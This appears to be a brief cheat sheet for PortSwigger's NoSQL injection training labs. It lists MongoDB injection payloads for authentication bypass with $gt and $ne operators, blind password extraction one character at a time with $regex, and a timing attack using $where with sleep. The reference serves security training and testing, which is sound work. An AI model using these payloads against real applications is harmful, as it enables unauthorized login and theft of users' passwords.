# PortSwigger NoSQL Injection Labs — Complete Reference

## MongoDB Injection

### Auth Bypass
```javascript
// JSON body
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// URL encoded
username[$gt]=&password[$gt]=
```

### Data Extraction
```javascript
// $regex extraction
{"username": "admin", "password": {"$regex": "^a"}}  // true/false based
{"username": "admin", "password": {"$regex": "^b"}}  // etc.

// $ne (not equal)
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

### Blind Extraction via $regex
```javascript
// Character by character
{"username":"admin","password":{"$regex":".*"}}  // true
{"username":"admin","password":{"$regex":"^a.*"}} // test first char
{"username":"admin","password":{"$regex":"^ad.*"}} // test second char
```

### Timing-based
```javascript
{"$where": "sleep(5000) || true"}
```
